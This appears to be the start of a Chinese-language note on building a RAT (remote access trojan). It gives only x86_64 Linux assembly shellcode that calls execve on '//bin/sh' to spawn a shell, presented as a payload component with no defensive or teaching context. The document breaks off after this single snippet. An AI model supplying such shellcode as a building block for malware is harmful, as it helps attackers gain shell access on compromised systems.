# RAT制作

## Shellcode

### Linux Shellcode

1.

x86_64.asm
```asm
section .text
global _start

_start:
    xor rax, rax
    push rax
    mov rbx, 0x68732f6e69622f2f ; //bin/sh
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 59
    syscall
```
